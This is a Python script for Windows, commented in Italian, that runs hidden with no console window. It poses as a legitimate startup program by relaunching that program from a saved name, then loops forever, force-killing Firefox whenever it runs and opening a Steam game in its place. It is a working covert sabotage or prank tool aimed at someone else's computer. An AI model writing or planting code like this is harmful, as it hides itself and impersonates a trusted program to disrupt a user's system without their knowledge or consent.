import os, time, subprocess

CREATE_NO_WINDOW = 0x08000000 #FLAG CHE EVITA CHE SI APRA IL TERMINALE

#NOME DEL PROGRAMMA DA KILLARE
execName = "firefox.exe"
#IL COMANDO CHE VOGLIAMO LANCIARE DOPO AVER KILLATO IL PROGRAMMA
commandToExecute = "start "" steam://rungameid/1066890"

#FILE CHE CONTIENE L'EVENTULE PROGRAMMA DA CUI CI SIAMO MASCHERATI
#CI SERVE SAPERE CHE PROGRAMMA STIAMO IMPERSONANDO PER POTERLO LANCIARE
#E LASCIARE INALTERATO IL FLUSSO DI PROGRAMMI LANCIATI ALL'AVVIO
fileName = "exeName.txt"

try:
    f = open(fileName, "r", encoding = "utf-8")
    exeName = f.readline()
    f.close()
except:
    exeName = ""

if exeName != "":
    os.system(f"powershell start '{exeName}'")

while True:
    tasks = str(subprocess.run("tasklist", stdout = subprocess.PIPE, shell = False, creationflags = CREATE_NO_WINDOW)).split()

    for t in tasks:
        if execName in t.split(" ")[0]:
            time.sleep(1)
            try:
                subprocess.run(f"taskkill /IM {execName} /F", shell = False, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL, check = True, creationflags = CREATE_NO_WINDOW)
                subprocess.run(commandToExecute, shell = False, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL, check = True, creationflags = CREATE_NO_WINDOW)
            except:
                pass

    time.sleep(5)